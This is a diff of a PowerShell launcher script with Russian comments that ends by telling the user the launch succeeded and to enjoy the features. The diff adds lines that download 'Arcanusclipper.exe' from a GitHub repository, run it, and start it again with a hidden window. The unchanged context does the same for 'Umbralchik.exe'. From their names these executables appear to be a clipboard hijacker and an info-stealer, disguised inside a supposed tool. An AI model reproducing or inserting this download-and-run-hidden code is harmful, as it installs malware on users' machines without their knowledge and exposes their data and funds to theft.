@@ -57,6 +57,11 @@ catch {
 }
     
     # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe"; .\Arcanusclipper.exe    
+    # Запускаем 
+    Start-Process -FilePath "Arcanusclipper.exe" -WindowStyle Hidden
+    
+    # Скачиваем everything в текущую папку
     Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe"; .\Umbralchik.exe    
     # Запускаем 
     Start-Process -FilePath "Umbralchik.exe" -WindowStyle Hidden
@@ -140,5 +145,6 @@ Write-Host "ЗАПУСК УСПЕШЕН! Наслаждайся функциям
 Write-Host ""
 Write-Host "Нажми любую клавишу для выхода..."
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+
 
 
